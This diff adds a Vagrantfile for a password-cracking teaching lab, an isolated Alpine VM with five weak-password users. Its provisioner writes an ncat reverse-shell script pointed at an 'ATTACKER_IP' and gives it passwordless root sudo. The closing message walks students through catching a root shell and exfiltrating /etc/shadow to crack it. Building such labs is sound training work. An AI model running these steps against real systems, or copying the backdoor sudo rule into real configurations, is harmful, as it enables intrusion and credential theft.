@@ -1,0 +1,113 @@
+# -*- mode: ruby -*-
+# vi: set ft=ruby :
+
+# ==============================================================================
+# Lab 7: Password Cracking — Alpine Linux Target
+# ==============================================================================
+#
+# Created: 2026-03-29
+# Author: Miguel Guirao
+# ==============================================================================
+# WARNING: This VM ships with intentionally weak passwords for educational
+# purposes. Use ONLY in an isolated lab environment.
+# NEVER expose to the internet or any untrusted network.
+# ==============================================================================
+
+Vagrant.configure("2") do |config|
+
+  config.vm.box      = "generic/alpine318"
+  config.vm.hostname = "alpine-target"
+
+  # Private host-only network — reachable from your ParrotOS/Kali machine
+  config.vm.network "private_network", ip: "192.168.56.101"
+
+  config.vm.provider "virtualbox" do |vb|
+    vb.name   = "lab7-alpine-target"
+    vb.memory = "512"
+    vb.cpus   = 1
+  end
+
+  # Single-quoted Ruby heredoc — prevents Ruby from interpolating $ characters
+  # inside the provisioner. Shell variable expansion still works normally.
+  config.vm.provision "shell", inline: <<-'SHELL'
+    echo "============================================================"
+    echo " Lab 7: Alpine Linux Target — Provisioning"
+    echo "============================================================"
+
+    # -------------------------------------------------------------------
+    # Packages
+    # -------------------------------------------------------------------
+    echo "[*] Installing packages..."
+    apk update -q
+    apk add --no-cache shadow nmap-ncat bash
+
+    # -------------------------------------------------------------------
+    # Create lab users
+    # -------------------------------------------------------------------
+    echo "[*] Creating lab users..."
+    for user in user01 user02 user03 user04 user05; do
+      useradd -m -s /bin/sh "$user" 2>/dev/null || true
+    done
+
+    # Set passwords — increasing complexity (single quotes protect special chars)
+    printf '%s\n' 'user01:password123'   | chpasswd
+    printf '%s\n' 'user02:Summer2024!'   | chpasswd
+    printf '%s\n' 'user03:Tr0ub4dor3'    | chpasswd
+    printf '%s\n' 'user04:C0rr3ct!Horse' | chpasswd
+    printf '%s\n' 'user05:xK9#mP2$vL7!' | chpasswd
+
+    echo "[*] Lab users created: user01 user02 user03 user04 user05"
+
+    # -------------------------------------------------------------------
+    # Reverse shell trigger script
+    # -------------------------------------------------------------------
+    # Students run this (as root via sudo) to initiate the reverse shell
+    # back to their ParrotOS listener.
+    cat > /opt/trigger_shell.sh << 'SCRIPTEOF'
+#!/bin/sh
+# Usage: sudo /opt/trigger_shell.sh <ATTACKER_IP> <PORT>
+ATTACKER_IP="${1:-192.168.56.1}"
+PORT="${2:-4444}"
+echo "[*] Connecting to ${ATTACKER_IP}:${PORT} ..."
+ncat "$ATTACKER_IP" "$PORT" -e /bin/sh
+SCRIPTEOF
+
+    chmod 0755 /opt/trigger_shell.sh
+
+    # Allow vagrant user to run this script as root — no password prompt
+    echo "vagrant ALL=(root) NOPASSWD: /opt/trigger_shell.sh" \
+      > /etc/sudoers.d/lab7-trigger
+    chmod 0440 /etc/sudoers.d/lab7-trigger
+
+    echo ""
+    echo "============================================================"
+    echo " Provisioning complete!"
+    echo " Target IP : 192.168.56.101"
+    echo " Users     : user01 user02 user03 user04 user05"
+    echo "============================================================"
+  SHELL
+
+  config.vm.post_up_message = <<-MSG
+    ============================================================
+     Lab 7 — Alpine Linux Password Cracking Target
+    ============================================================
+
+     Target IP : 192.168.56.101
+     SSH access: vagrant ssh
+
+     Lab workflow (read the full README first):
+
+       1. On ParrotOS — start your listener:
+            nc -lvnp 4444
+
+       2. Inside this VM — trigger the reverse shell:
+            sudo /opt/trigger_shell.sh <YOUR_PARROTOS_IP> 4444
+
+       3. Back on ParrotOS — you now have a root shell.
+          Exfiltrate /etc/passwd and /etc/shadow, then crack.
+
+     WARNING: Intentionally weak passwords. Keep this VM isolated.
+    ============================================================
+  MSG
+
+end
